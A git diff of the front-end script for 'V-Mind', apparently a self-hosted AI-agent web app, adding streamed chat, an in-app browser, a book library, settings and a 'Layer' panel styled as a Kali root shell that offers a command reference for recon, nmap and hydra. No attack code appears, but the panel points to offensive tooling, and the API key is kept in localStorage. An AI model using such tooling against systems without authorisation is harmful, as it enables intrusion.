+    }
+    let reader=r.body.getReader(),decoder=new TextDecoder(),msgEl=null,full='',doneReceived=false
+    while(true){
+      let{done,value}=await reader.read()
+      if(done)break
+      let chunk=decoder.decode(value)
+      if(appMode==='api'){
+        for(let line of chunk.split('\n').filter(l=>l.startsWith('data: '))){
+          let data=line.slice(6);if(data==='[DONE]'){doneReceived=true;break}
+          try{let content=JSON.parse(data).choices?.[0]?.delta?.content||'';if(content){full+=content;if(!msgEl){let c=document.getElementById('chat-inner');msgEl=document.createElement('div');msgEl.className='chat-msg assistant';msgEl.textContent=full;c.appendChild(msgEl);document.getElementById('chat-area').scrollTop=document.getElementById('chat-area').scrollHeight}else msgEl.textContent=full}}catch(_){}
+        }
+      }else{
+        for(let line of chunk.trim().split('\n')){
+          try{let ev=JSON.parse(line);if(ev.type==='token'){full+=ev.content;if(!msgEl){let c=document.getElementById('chat-inner');msgEl=document.createElement('div');msgEl.className='chat-msg assistant';msgEl.textContent=full;c.appendChild(msgEl);document.getElementById('chat-area').scrollTop=document.getElementById('chat-area').scrollHeight}else msgEl.textContent=full}else if(ev.type==='done'){doneReceived=true;let final=ev.content||full;if(msgEl){msgEl.remove();addMsg(final,'assistant')}else addMsg(final,'assistant');full=final}}catch(_){}
+        }
       }
     }
-    msgEl.textContent = full || '(no response)';
-  } catch(e) { msgEl.textContent = 'Error: ' + e.message; }
+    if(!doneReceived&&!appMode.startsWith('api')){if(!msgEl)addMsg(full||'No response.','assistant');else{msgEl.remove();addMsg(full,'assistant')}}
+    if(appMode==='api'){doneReceived=true;if(msgEl&&full&&msgEl.textContent!==full){msgEl.textContent=full}}
+    speakText(full)
+    let elapsed=Date.now()-t0
+    if(elapsed>5000&&'Notification'in window&&Notification.permission==='granted')new Notification('V-Mind replied',{body:'('+(elapsed/1000).toFixed(1)+'s) '+(full||'').slice(0,80)+'...'})
+  }catch(e){addMsg('Error: '+e.message,'assistant')}
+  loading=false;document.getElementById('send-btn').disabled=false;document.getElementById('chat-input').focus()
 }
 
-async function sendApiChat(text, msgEl) {
-  const model = modelSelect.value;
-  const baseUrl = apiProvider === 'openrouter' ? 'https://openrouter.ai/api/v1' : 'https://api.openai.com/v1';
-  try {
-    let r = await origFetch(baseUrl + '/chat/completions', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + apiKey, ...(apiProvider === 'openrouter' ? {'HTTP-Referer': window.location.origin} : {})},
-      body: JSON.stringify({model, messages: [{role: 'system', content: 'You are V-Mind, a super-intelligent AI agent. Be concise and helpful.'}, {role: 'user', content: text}], stream: true}),
-      signal: AbortSignal.timeout(60000)
-    });
-    if (!r.ok) { let err = await r.text(); msgEl.textContent = 'API Error: ' + (JSON.parse(err).error?.message || err); return; }
-    let reader = r.body.getReader();
-    let decoder = new TextDecoder();
-    let full = '';
-    while (true) {
-      let {done, value} = await reader.read();
-      if (done) break;
-      for (let line of decoder.decode(value).split('\n').filter(l => l.startsWith('data: '))) {
-        let data = line.slice(6);
-        if (data === '[DONE]') break;
-        try { let content = JSON.parse(data).choices?.[0]?.delta?.content || ''; if (content) { full += content; msgEl.textContent = full; } } catch(_) {}
-      }
-    }
-    if (!full && msgEl.textContent === 'Thinking...') msgEl.textContent = '(empty response)';
-  } catch(e) { msgEl.textContent = 'Error: ' + e.message; }
+// --- LAYER ---
+function wl(text){let o=document.getElementById('layer-out'),d=document.createElement('div');d.className='l';d.innerHTML=text;o.appendChild(d);o.scrollTop=o.scrollHeight}
+async function qLayer(q){
+  let inp=document.getElementById('layer-input'),query=q||inp.value.trim()
+  if(!query)return;if(!q)inp.value=''
+  wl('<span class="g">root@kali:~#</span> '+esc(query))
+  try{let r=await fetch('/api/layer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query})});let d=await r.json();wl('<span class="d">'+esc(d.result).replace(/\n/g,'<br>')+'</span>')}catch(e){wl('<span class="r">Error: '+esc(e.message)+'</span>')}
+}
+function sendLayer(){qLayer()}
+
+// --- BROWSER ---
+function brTab(t,btn){
+  document.querySelectorAll('#browser-tabs button').forEach(b=>b.classList.remove('active'));if(btn)btn.classList.add('active')
+  let iframe=document.getElementById('browser-iframe'),fallback=document.getElementById('browser-fallback'),toolbar=document.getElementById('browser-toolbar')
+  if(t==='browse'){iframe.style.display='';fallback.style.display='none';toolbar.style.display=''}else{iframe.style.display='none';fallback.style.display='';toolbar.style.display='none';if(!brSearchContent)fallback.innerHTML='<div style="display:flex;align-items:center;justify-content:center;color:#555;font-size:13px;flex-direction:column;gap:8px;height:100%"><div style="font-size:48px;opacity:.3">&#128269;</div><div>Enter a search query above</div></div>';else fallback.innerHTML=brSearchContent}
+}
+function brNavigate(url){
+  if(!url)return;let iframe=document.getElementById('browser-iframe'),fb=document.getElementById('browser-fallback'),st=document.getElementById('browser-status');st.textContent='Loading...'
+  if(!url.includes('.')||url.includes(' ')){brSearch(url);return}
+  if(!url.startsWith('http'))url='https://'+url
+  document.getElementById('browser-url').value=url;iframe.style.display='';fb.innerHTML='';let loaded=false
+  iframe.onload=()=>{if(loaded)return;loaded=true;st.textContent='Loaded';brPush(url);document.getElementById('br-back').disabled=brIdx<=0;document.getElementById('br-fwd').disabled=brIdx>=brHistory.length-1}
+  iframe.onerror=()=>{st.textContent='Page blocked';brFetchUrl(url)}
+  iframe.src=url
+  setTimeout(()=>{if(!loaded){iframe.style.display='none';st.textContent='Text view';brFetchUrl(url)}},5000)
+}
+function brSearch(q){
+  document.getElementById('browser-url').value=q;let fb=document.getElementById('browser-fallback'),st=document.getElementById('browser-status')
+  fb.innerHTML='<div style="text-align:center;padding:30px;color:var(--dim)"><div style="font-size:28px;margin-bottom:8px">&#8987;</div>Searching...</div>'
+  fetch('/api/web_search?q='+encodeURIComponent(q)+'&search_type=text').then(r=>r.json()).then(d=>{if(d.error){fb.innerHTML='<div style="padding:16px;color:var(--red)">'+esc(d.error)+'</div>';return}brSearchContent='<div style="padding:8px 12px;font-size:10px;color:var(--dim);border-bottom:1px solid #222">'+d.results.length+' results</div>';brSearchContent+='<div style="padding:4px 8px">'+d.results.map((r,i)=>'<div style="padding:6px 4px;border-bottom:1px solid rgba(255,255,255,.04)"><a href="'+esc(r.url)+'" target="_blank" style="color:var(--accent);font-size:12px;font-weight:500;text-decoration:none;cursor:pointer" onclick="event.preventDefault();brNavigate(\''+escJs(r.url)+'\')">'+esc(r.title)+'</a><div style="font-size:10px;color:#555;margin:1px 0">'+esc(r.url.slice(0,60))+'</div><div style="font-size:10px;color:var(--dim);line-height:1.5">'+esc(r.snippet||'')+'</div></div>').join('')+'</div>';fb.innerHTML=brSearchContent;st.textContent=d.results.length+' results';brPush('search: '+q)}).catch(e=>{fb.innerHTML='<div style="padding:16px;color:var(--red)">Error: '+esc(e.message)+'</div>';st.textContent='Error'})
+}
+async function brFetchUrl(url){let fb=document.getElementById('browser-fallback'),st=document.getElementById('browser-status');try{let r=await fetch('/api/fetch?url='+encodeURIComponent(url));let d=await r.json();if(d.error){fb.innerHTML='<div style="padding:16px;color:var(--red)">'+esc(d.error)+'</div>';st.textContent='Error';return}let c=d.content||'';if(c.length<20)c='<div style="padding:20px;color:var(--dim);text-align:center">Requires JS. <a href="'+esc(url)+'" target="_blank" style="color:var(--accent);display:block;margin-top:8px">Open in browser &rarr;</a></div>';else c='<div style="padding:12px;font-size:11px;line-height:1.7;white-space:pre-wrap;color:var(--text)">'+esc(c)+'</div>';fb.innerHTML='<div style="display:flex;align-items:center;gap:8px;padding:6px 10px;border-bottom:1px solid #222;font-size:11px"><span style="color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1">'+esc(url.slice(0,80))+'</span><a href="'+esc(url)+'" target="_blank" style="color:var(--accent);font-size:10px;text-decoration:none">Open &#x2197;</a></div>'+c;st.textContent='Page rendered'}catch(e){fb.innerHTML='<div style="padding:16px;color:var(--red)">Error: '+esc(e.message)+'</div>';st.textContent='Error'}}
+function brPush(url){brHistory=brHistory.slice(0,brIdx+1);brHistory.push(url);brIdx=brHistory.length-1}
+function brBack(){if(brIdx<=0)return;brIdx--;let url=brHistory[brIdx];if(url.startsWith('search: '))brSearch(url.slice(8));else{document.getElementById('browser-url').value=url;document.getElementById('browser-iframe').style.display='';document.getElementById('browser-iframe').src=url;document.getElementById('browser-status').textContent='Loaded'}document.getElementById('br-back').disabled=brIdx<=0;document.getElementById('br-fwd').disabled=brIdx>=brHistory.length-1}
+function brForward(){if(brIdx>=brHistory.length-1)return;brIdx++;let url=brHistory[brIdx];if(url.startsWith('search: '))brSearch(url.slice(8));else{document.getElementById('browser-url').value=url;document.getElementById('browser-iframe').style.display='';document.getElementById('browser-iframe').src=url;document.getElementById('browser-status').textContent='Loaded'}document.getElementById('br-back').disabled=brIdx<=0;document.getElementById('br-fwd').disabled=brIdx>=brHistory.length-1}
+function brRefresh(){let url=document.getElementById('browser-url').value;if(url)brNavigate(url)}
+
+// --- LIBRARY ---
+async function loadBooks(){try{let r=await fetch('/api/library/books');libBooks=await r.json();renderLibShelf(libBooks)}catch(e){document.getElementById('lib-shelf').innerHTML='<div class="lib-empty"><div class="icon">&#128218;</div>Error loading books</div>'}}
+function renderLibShelf(books,isSearch){
+  let el=document.getElementById('lib-shelf')
+  if(!books||books.length===0){el.innerHTML='<div class="lib-empty"><div class="icon">&#128218;</div><div>No books</div></div>';return}
+  el.innerHTML=books.map(b=>{if(b.id){return'<div class="lib-book" onclick="openBook(\''+esc(b.id)+'\')"><div class="cover" id="cov-'+esc(b.id.replace(/[^a-zA-Z0-9]/g,''))+'"><span class="cov-fallback">&#128214;</span></div><div class="title">'+esc(b.title)+'</div><div class="author">'+esc(b.author||'Unknown')+'</div><div class="meta">'+esc(b.pages||b.size||'')+'</div></div>'}else{return'<div class="lib-book" style="border-color:#2a5a3a"><div class="cover" style="background:linear-gradient(135deg,#1a4a2a,#2a7a4a);color:#4af88a;font-size:14px"><span>&#127760;</span></div><div class="title">'+esc(b.title)+'</div><div class="author">'+esc(b.author||'Unknown')+'</div><button onclick="downloadBook(\''+escJs(b.url)+'\',\''+escJs(b.title)+'\',\''+escJs(b.author||'Unknown')+'\')" style="margin-top:2px;padding:1px 6px;background:var(--green);color:#000;border:none;border-radius:2px;cursor:pointer;font-size:8px;font-family:inherit;font-weight:600">+ Add</button></div>'}}).join('')
+  if(isSearch)el.innerHTML+='<div style="font-size:9px;color:#555;padding:2px;text-align:center">Click +Add to download</div>'
+  if(books)books.forEach(b=>{if(b.id)loadCover(b.id,b.title,b.author)})
+}
+async function loadCover(id,title,author){let el=document.getElementById('cov-'+id.replace(/[^a-zA-Z0-9]/g,''));if(!el)return;try{let r=await fetch('/api/library/cover?title='+encodeURIComponent(title)+'&author='+encodeURIComponent(author));let d=await r.json();if(d.url){let img=document.createElement('img');img.src=d.url;img.alt='';img.onerror=()=>{};img.onload=()=>{el.innerHTML='';el.appendChild(img)}}}catch(e){}}
+function searchLib(q){if(!q){renderLibShelf(libBooks);return}let low=q.toLowerCase();let local=libBooks.filter(b=>b.title.toLowerCase().includes(low)||(b.author||'').toLowerCase().includes(low));if(local.length>0){renderLibShelf(local);return}clearTimeout(libSearchTimeout);libSearchTimeout=setTimeout(async()=>{let el=document.getElementById('lib-shelf');el.innerHTML='<div style="text-align:center;padding:30px;color:#555">Searching...</div>';try{let r=await fetch('/api/library/find?q='+encodeURIComponent(q));let d=await r.json();if(d.results&&d.results.length)renderLibShelf(d.results,true);else el.innerHTML='<div class="lib-empty"><div class="icon">&#128218;</div>No books found for "'+esc(q)+'"</div>'}catch(e){el.innerHTML='<div class="lib-empty"><div class="icon">&#128218;</div>Search error</div>'}},400)}
+let libSearchTimeout=null
+async function downloadBook(url,title,author){let el=document.getElementById('lib-shelf');el.innerHTML='<div style="text-align:center;padding:30px;color:#555">Downloading...</div>';try{let r=await fetch('/api/library/download',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,title,author})});let d=await r.json();if(d.ok){loadBooks();document.getElementById('lib-search').value=''}else alert('Download failed: '+d.error)}catch(e){alert('Error: '+e.message)}}
+async function openBook(id){try{let r=await fetch('/api/library/book/'+encodeURIComponent(id));let book=await r.json();libReaderActive=true;document.getElementById('lib-shelf').style.display='none';let reader=document.getElementById('lib-reader');reader.style.display='block';reader.innerHTML='';let lines=book.content.split('\n'),html='',inCode=false;for(let line of lines){if(line.startsWith('# '))html+='<h1>'+esc(line.slice(2))+'</h1>';else if(line.startsWith('## '))html+='<h2>'+esc(line.slice(3))+'</h2>';else if(line.startsWith('```')){if(inCode)html+='</code></pre>';else html+='<pre><code>';inCode=!inCode}else if(inCode)html+=esc(line)+'\n';else if(line.trim()==='')html+='<p>&nbsp;</p>';else html+='<p>'+esc(line)+'</p>'}if(inCode)html+='</code></pre>';reader.innerHTML='<h1>'+esc(book.title)+'</h1>'+html}catch(e){document.getElementById('lib-reader').innerHTML='<p>Error: '+e.message+'</p>'}}
+function showLibShelf(){libReaderActive=false;document.getElementById('lib-shelf').style.display='';document.getElementById('lib-reader').style.display='none';renderLibShelf(libBooks)}
+async function uploadBook(inp){if(!inp.files||!inp.files.length)return;let fd=new FormData();for(let f of inp.files)fd.append('files',f);try{let r=await fetch('/api/library/upload',{method:'POST',body:fd});let d=await r.json();if(d.ok){loadBooks();document.getElementById('lib-search').value=''}else alert('Upload failed: '+d.error)}catch(e){alert('Error: '+e.message)}inp.value=''}
+setTimeout(loadBooks,500)
+
+// --- VIEWS HTML ---
+document.getElementById('main').insertAdjacentHTML('beforeend','<div id="layer-view"><div class="panel-bg" id="bg-layer"></div><div id="layer-out"><div class="l"><span class="d"># The Layer — Kali command reference</span></div></div><div id="layer-input-row"><span class="prompt">root@kali:~#</span><input id="layer-input" type="text" placeholder="recon, nmap, hydra, help" onkeydown="if(event.key===\'Enter\')sendLayer()"></div></div>')
+document.getElementById('main').insertAdjacentHTML('beforeend','<div id="browser-view"><div class="panel-bg" id="bg-browser"></div><div id="browser-tabs"><button class="active" onclick="brTab(\'browse\',this)">&#127760; Browse</button><button onclick="brTab(\'search\',this)">&#128269; V-Search</button></div><div id="browser-toolbar"><button id="br-back" onclick="brBack()" disabled>&#9664;</button><button id="br-fwd" onclick="brForward()" disabled>&#9654;</button><button onclick="brRefresh()">&#8635;</button><input id="browser-url" type="text" placeholder="Enter URL or search..." onkeydown="if(event.key===\'Enter\')brNavigate(this.value)"><button onclick="brNavigate(document.getElementById(\'browser-url\').value)">Go</button></div><div id="browser-status">Ready</div><div id="browser-content"><iframe id="browser-iframe" sandbox="allow-scripts allow-same-origin allow-forms allow-popups" style="display:none;width:100%;height:100%;border:none"></iframe><div id="browser-fallback" style="display:flex;align-items:center;justify-content:center;color:#555;font-size:13px;flex-direction:column;gap:8px;height:100%"><div style="font-size:48px;opacity:.3">&#127760;</div><div>Enter a URL or search the web</div></div></div></div>')
+document.getElementById('main').insertAdjacentHTML('beforeend','<div id="library-view"><div class="panel-bg" id="bg-library"></div><div id="lib-header"><button onclick="showLibShelf()">&larr; Back</button><span class="lib-title">Library</span><input id="lib-search" type="text" placeholder="Search books..." oninput="searchLib(this.value)"><button onclick="document.getElementById(\'lib-upload\').click()">+ Upload</button><input id="lib-upload" type="file" accept=".txt,.md" style="display:none" onchange="uploadBook(this)"></div><div id="lib-shelf" class="lib-shelf"></div><div id="lib-reader" class="lib-reader" style="display:none"></div></div>')
+document.getElementById('main').insertAdjacentHTML('beforeend','<div id="settings-view"><div class="settings-group"><h3>Model</h3><div class="settings-row"><span>AI Model</span><select id="settings-model" onchange="updateModel(this.value)"><option value="cohere/north-mini-code:free">Cohere North Mini Code (Free)</option><option value="openai/gpt-oss-120b:free">GPT-OSS 120B (Free)</option><option value="google/gemma-4-26b-a4b-it:free">Gemma 4 26B (Free)</option><option value="google/gemma-4-31b-it:free">Gemma 4 31B (Free)</option></select></div><div class="settings-row"><span>Temperature</span><input type="number" id="settings-temp" value="0.3" min="0" max="2" step="0.1" style="width:50px"></div></div><div class="settings-group"><h3>Backend</h3><div class="settings-row"><span>Backend</span><select id="settings-backend" onchange="switchBackend(this.value)"><option value="auto">Auto</option><option value="remote">Remote</option><option value="local">Local (Ollama)</option></select></div><div class="settings-row"><span>Status</span><span id="settings-status">checking...</span></div><div class="settings-row"><span>Ollama</span><span id="settings-ollama">checking...</span></div></div></div>')
+
+// --- SETTINGS ---
+async function renderSettings(){try{let r=await fetch('/api/status');let d=await r.json();let st=d.backend=='local'?'Local (Ollama)':(d.online?'Remote ('+d.model+')':'No API key');document.getElementById('settings-status').textContent=st;document.getElementById('settings-status').style.color=d.online?'var(--green)':(d.ollama_running?'var(--green)':'var(--red)');document.getElementById('settings-ollama').textContent=d.ollama_running?'Running ('+(d.ollama_models.length||0)+' models)':'Not installed';document.getElementById('settings-ollama').style.color=d.ollama_running?'var(--green)':'var(--dim)';document.getElementById('settings-backend').value=d.backend}catch(e){document.getElementById('settings-status').textContent='Error'}}
+async function switchBackend(b){localStorage.setItem('vmbackend',b);try{await fetch('/api/backend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({backend:b})});renderSettings()}catch(e){}}
+async function updateModel(m){document.getElementById('m-badge').textContent=m;try{await fetch('/api/models',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:m})})}catch(e){}}
+
+// --- BACKEND URL / API KEY ---
+document.getElementById('backendUrl').addEventListener('change',function(){backendUrl=this.value.replace(/\/+$/,'');localStorage.setItem('vmBackendUrl',backendUrl)})
+document.getElementById('apiKeyInput').addEventListener('change',function(){apiKey=this.value.trim();localStorage.setItem('vmApiKey',apiKey);if(appMode==='api'){document.getElementById('chat-input').disabled=!apiKey;document.getElementById('send-btn').disabled=!apiKey}})
+document.getElementById('apiProvider').addEventListener('change',function(){apiProvider=this.value;localStorage.setItem('vmApiProvider',apiProvider);let ms=document.getElementById('modelSelect');if(apiProvider==='openrouter'){ms.innerHTML='<option value="openai/gpt-4o">GPT-4o</option><option value="anthropic/claude-3.5-sonnet">Claude 3.5 Sonnet</option><option value="meta-llama/llama-3.3-70b-instruct">Llama 3.3 70B</option>'}else{ms.innerHTML='<option value="gpt-4o-mini">GPT-4o Mini</option><option value="gpt-4o">GPT-4o</option>'}})
+if(apiKey)document.getElementById('apiKeyInput').value=apiKey
+
+// --- CONNECTION ---
+function checkConnection(){
+  fetch('/api/status',{signal:AbortSignal.timeout(5000)}).then(r=>{if(!r.ok)throw new Error('Status '+r.status);return r.json()}).then(d=>{document.getElementById('status-text').textContent=d.online?d.model+' connected':(d.ollama_running?'local model ready':'no api key')}).catch(()=>{document.getElementById('status-text').textContent='connecting...'})
 }
 
-function addMsg(text, role) {
-  let d = document.createElement('div');
-  d.className = 'chat-msg ' + role;
-  d.textContent = text;
-  chatMessages.appendChild(d);
-  chatMessages.scrollTop = chatMessages.scrollHeight;
-  return d;
+// --- NOTIFICATIONS ---
+function pollNotifications(){
+  fetch('/api/notifications').then(r=>r.json()).then(d=>{if(!d.notifications)return;d.notifications.forEach(n=>{let key=n.kind+'_'+n.timestamp;if(notifiedEvents.has(key))return;notifiedEvents.add(key);if('Notification'in window&&Notification.permission==='granted')new Notification('V-Mind Alert: '+n.kind,{body:n.detail})})}).catch(()=>{})
 }
 
-// Skip auto-check if in api mode
-if (localStorage.getItem('vmApiKey')) {
-  apiKey = localStorage.getItem('vmApiKey');
-  apiKeyInput.value = apiKey;
-}
-setMode('backend');
+// --- INIT ---
+setAppMode(appMode)
+if(speechMuted)document.getElementById('speaker-btn').classList.add('muted')
+window.speechSynthesis.getVoices()
+if('Notification'in window&&Notification.permission==='default')Notification.requestPermission()
+setMode(currentMode)
+renderSessions()
+let savedFolder=localStorage.getItem('vmfolder');if(savedFolder)document.getElementById('file-path-input').value=savedFolder;loadFileTree(document.getElementById('file-path-input').value)
+checkConnection()
+setInterval(checkConnection,5000)
+setInterval(pollNotifications,5000)
+
+// Layer render cats
+setTimeout(()=>{let o=document.getElementById('layer-out');let g=document.createElement('div');g.className='lgrid';for(let[c,n]of Object.entries(CATS)){let d=document.createElement('div');d.className='lcard';d.onclick=()=>qLayer(c);d.innerHTML='<h4>'+c.charAt(0).toUpperCase()+c.slice(1)+'</h4><p>'+n+' tools</p>';g.appendChild(d)}o.appendChild(g);o.scrollTop=o.scrollHeight},100)
 </script>
 </body>
 </html>
